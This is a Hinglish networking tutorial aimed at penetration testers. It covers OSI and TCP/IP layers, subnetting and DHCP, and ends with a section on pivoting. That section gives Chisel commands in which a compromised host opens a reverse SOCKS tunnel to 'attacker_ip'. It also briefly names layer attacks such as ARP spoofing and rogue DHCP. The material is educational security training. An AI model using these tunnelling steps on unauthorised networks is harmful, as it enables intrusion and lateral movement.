OSI & TCP/IP Models

Foundation

Har network communication in layers mein hoti hai. OSI 7-layer theoretical model hai, TCP/IP 4-layer practical model — dono samajhna zaroori hai kyunki tools aur exploits inhi layers pe target karte hain.

OSI LayerTCP/IP LayerFunctionExample
7. ApplicationApplicationEnd-user servicesHTTP, FTP, DNS, SMTP
6. PresentationEncryption, encoding, compressionTLS/SSL, JPEG
5. SessionSession establishment/managementNetBIOS, RPC
4. TransportTransportEnd-to-end delivery, reliabilityTCP, UDP
3. NetworkInternetLogical addressing, routingIP, ICMP
2. Data LinkNetwork AccessPhysical addressing, framesMAC address, ARP, Ethernet
1. PhysicalRaw bit transmissionCables, NICs, signals
Pentesting angle: Layer 2 attacks (ARP spoofing), Layer 3 (IP spoofing, routing attacks), Layer 4 (port scanning, TCP handshake abuse), Layer 7 (web app attacks) — har layer ka apna attack surface hota hai.

Core Skill
ConceptDetail

CIDR notation/24 = 255.255.255.0 (256 addresses), /16 = 65536 addresses

Broadcast/Network addressHar subnet ka first (network) aur last (broadcast) address reserved hota hai
# Quick subnet calculation tool
ipcalc 192.168.1.0/24

# Manual: /26 subnet = 64 addresses, 4 subnets in a /24
# 192.168.1.0/26   -> 192.168.1.0   - 192.168.1.63
# 192.168.1.64/26  -> 192.168.1.64  - 192.168.1.127
Pentest mein subnetting samajhna zaroori hai jab tumhe internal network range guess karke lateral scanning karni ho (e.g. AD environment mein 10.10.10.0/24 discover karna).

05

DHCP

Protocol

DHCP automatically IP addresses assign karta hai devices ko. Process: DORA — Discover → Offer → Request → Acknowledge.

StepAction
DiscoverClient broadcast karta hai "mujhe IP chahiye"
OfferDHCP server ek available IP offer karta hai
RequestClient us IP ko request karta hai formally
AcknowledgeServer confirm karta hai, lease time ke saath
Attack angle: DHCP starvation (fake requests se pool exhaust karna) aur rogue DHCP server (attacker apna DHCP chala ke traffic redirect kare) — dono MITM setups mein use hote hain.

14

Pivoting (Multi-network Pentest)

Advanced

Pivoting tab use hota hai jab ek machine compromise karne ke baad, us machine ke through ek dusre internal network tak pahunchna ho jo directly accessible nahi tha.

  1. Compromised machine pe dual-homed interfaces check karo (ip a)
  2. Internal subnet identify karo
  3. Tunneling tool setup karo (Chisel, ligolo-ng, SSH dynamic forward)
  4. Attacker machine se proxychains ke through internal hosts scan/exploit karo
# Chisel example — server on attacker, client on compromised host
# attacker:
./chisel server -p 8000 --reverse
# compromised host:
./chisel client attacker_ip:8000 R:socks
